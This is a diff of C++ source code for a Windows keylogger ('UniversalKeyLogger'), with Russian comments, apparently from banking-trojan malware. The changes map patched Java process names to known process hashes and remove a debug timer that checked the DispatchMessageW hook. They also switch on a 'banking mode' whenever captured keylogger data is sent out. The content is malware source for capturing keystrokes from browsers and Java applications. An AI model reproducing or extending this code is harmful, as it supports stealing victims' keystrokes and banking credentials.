@@ -1,3 +1,5 @@
+//---------------------------------------------------------------------------
+
 #include "UniversalKeyLogger.h"
 
 #include <Windows.h>
@@ -1235,6 +1237,17 @@ PKeyLogger KeyLogger::Initialize(PCHAR AppName)
 	Logger->ProcessName = STR::New(AppName);
 	Logger->ProcessNameHash = H;
 
+	#ifdef JAVS_PATCHERH
+		// При срабатывании чва патчера оригинальные имена процессов
+		// явы меняются, по этому будем проверять на совпадение резудьтирующим
+		// именам ява патчера
+		if (H == AnsiStr::Hash(Patched_Jawa_Name, 0, true))
+			H = PROCESS_HASH_JAVA;
+		else
+		if (H == AnsiStr::Hash(Patched_JawaW_Name, 0, true))
+			H = PROCESS_HASH_JAVAW;
+	#endif
+
 	// Пробуем определить в каком процессе работаем
 	if (H == PROCESS_HASH_IE)
 		Logger->Process = PROCESS_IE;
@@ -1309,32 +1322,10 @@ PCHAR KeyLoggerGetSystemName(PKeyLogger Logger)
 
 
 
-VOID CALLBACK TestTimerProc(HWND, UINT, UINT_PTR, DWORD)
-{
-	// Выводим сообщение о рабете кейлогера
-	PKeyLogger L = GetLogger(true);
-//	if (L)
-//		KLGDBG("---- UnKLG", "Кейлогер работает");
-//	else
-//    	KLGDBG("---- UnKLG", "Кейлогер отключен");
-
-	const static DWORD Hash_DispatchMessageW = 0x4BAED1DE;
-
-	LPVOID ProcAddr = GetProcAddressEx(NULL, 3, Hash_DispatchMessageW );
-//	if (ProcAddr != &KeyLoggerHooks::Hook_DispatchMessageW)
-//		KLGDBG("========== UnKLG", "Хук изменён!!!!!");
-
-}
-
-
 bool KeyLogger::Start()
 {
 	if (GlobalKeyLogger == NULL)
 		return false;
-
-
-
-	pSetTimer(NULL, 15, 5000, TestTimerProc);
 
 	// Запуск кейлогера
 
@@ -2726,6 +2717,11 @@ bool KeyLogger::SendLoggerFile(PCHAR LogFileName, bool *InvalidFile)
 
 
 
+	// При любой отправке данных кейлогера включаем режим Банк
+    SetBankingMode();
+
+
+
 	PKeyLogPacker Packer = KLGPacker::Initialize(LogFileName, false);
 	if (Packer == NULL)
 		return false;
@@ -3472,4 +3468,6 @@ PCHAR KLGPacker::GetTextDataFromFile(PCHAR FileName, HWND Wnd)
 
 	return Result;
 }
+
+//----------------------------------------------------------------------------
 
